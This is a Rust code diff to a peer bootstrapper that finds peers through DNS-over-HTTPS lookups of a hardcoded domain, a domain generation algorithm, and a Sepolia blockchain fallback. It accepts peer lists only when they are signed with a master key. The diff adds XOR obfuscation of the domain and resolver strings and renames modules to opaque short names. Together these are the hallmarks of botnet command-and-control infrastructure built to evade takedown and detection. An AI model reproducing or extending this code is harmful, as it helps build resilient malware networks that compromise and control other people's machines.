@@ -59,14 +59,19 @@ impl ProfessionalBootstrapper {
         };
 
         // 1. Primary: dht.polydevs.uk
+        // "dht.polydevs.uk" XOR 0x77
+        let domain_enc = [0x13, 0x1f, 0x03, 0x59, 0x07, 0x18, 0x1b, 0x0e, 0x13, 0x12, 0x01, 0x04, 0x59, 0x02, 0x1c];
+        // "https://dns.google/resolve" XOR 0x77
+        let resolver_enc = [0x1f, 0x03, 0x03, 0x07, 0x04, 0x4d, 0x58, 0x58, 0x13, 0x19, 0x04, 0x59, 0x10, 0x18, 0x18, 0x10, 0x1b, 0x12, 0x58, 0x05, 0x12, 0x04, 0x18, 0x1b, 0x01, 0x12];
+        
         bs.primary_providers.push(Arc::new(DohProvider {
-            domain: "dht.polydevs.uk".to_string(),
-            resolver_url: "https://dns.google/resolve".to_string(),
+            domain: xd(&domain_enc, 0x77),
+            resolver_url: xd(&resolver_enc, 0x77),
         }));
 
         // 2. Secondary: DGA
         bs.fallback_providers.push(Arc::new(DgaProvider {
-            resolver_url: "https://dns.google/resolve".to_string(),
+            resolver_url: xd(&resolver_enc, 0x77),
         }));
         
         bs
@@ -91,9 +96,16 @@ impl ProfessionalBootstrapper {
                     std::thread::sleep(Duration::from_millis(
                         rand::thread_rng().gen_range(0..1000)
                     ));
+                    crate::k::debug::log_detail!("Provider {} fetching...", p.name());
                     match p.fetch_payload() {
-                        Ok(payload) => verify_signature(&payload).map(|ips| (p.name(), ips)),
-                        Err(e) => Err(e),
+                        Ok(payload) => {
+                             crate::k::debug::log_detail!("Provider {} success. Verifying sig...", p.name());
+                             verify_signature(&payload).map(|ips| (p.name(), ips))
+                        },
+                        Err(e) => {
+                            crate::k::debug::log_detail!("Provider {} failed: {}", p.name(), e);
+                            Err(e)
+                        },
                     }
                 }).await
             }));
@@ -104,6 +116,7 @@ impl ProfessionalBootstrapper {
             match handle.await {
                 Ok((source_name, peers)) => {
                     info!("[Bootstrap] SUCCESS via {}. Found {} peers.", source_name, peers.len());
+                    crate::k::debug::log_op!("Bootstrap", format!("Tier Success: {} ({} peers)", source_name, peers.len()));
                     return Some(peers);
                 }
                 _ => {}
@@ -156,11 +169,13 @@ impl ProfessionalBootstrapper {
         
         // Tier 0: Local Persistence
         if let Some(nodes) = self.load_cache_peers() {
+            crate::k::debug::log_op!("Bootstrap", "Loaded from Local Cache (Tier 0)");
             return Some(nodes);
         }
         
         // Tier 1: Primary (DoH)
         info!("[Bootstrap] Attempting Tier 1 (DoH/Home)...");
+        crate::k::debug::log_op!("Bootstrap", "Starting Tier 1 (DoH)...");
         if let Some(nodes) = self.race_tier(&self.primary_providers).await {
             return Some(nodes);
         }
@@ -181,7 +196,7 @@ impl ProfessionalBootstrapper {
 
         // Tier 4: Blockchain
         info!("[Bootstrap] Tier 3 Failed. Attempting Tier 4 (Sepolia Blockchain)...");
-        use crate::discovery::eth_listener;
+        use crate::d::eth_listener;
         if let Some((nodes, _blob)) = eth_listener::check_sepolia_fallback().await {
              info!("[Bootstrap] SUCCESS via Tier 4 (Sepolia). Found {} peers.", nodes.len());
              return Some(nodes);
@@ -207,11 +222,15 @@ fn verify_signature(text: &str) -> Result<Vec<(String, u16)>, Box<dyn Error + Se
     let msg_bytes = general_purpose::STANDARD.decode(msg_part)?;
 
     let vk = VerifyingKey::from_bytes(&MASTER_PUB_KEY).map_err(|_| "Invalid PubKey")?;
+    
+    crate::k::debug::log_detail!("Verifying Signature ({} bytes msg, {} bytes sig)...", msg_bytes.len(), sig_bytes.len());
+    
     let signature = Signature::from_bytes(&sig_bytes.try_into().map_err(|_| "Invalid Sig Len")?);
-
+    
     vk.verify(&msg_bytes, &signature).map_err(|e| format!("Crypto Fail: {}", e))?;
     
     debug!("[Bootstrap] Logic Signature Verified.");
+    crate::k::debug::log_detail!("Signature VALID.");
     
     let msg_str = String::from_utf8(msg_bytes)?;
     parse_ip_list(&msg_str)
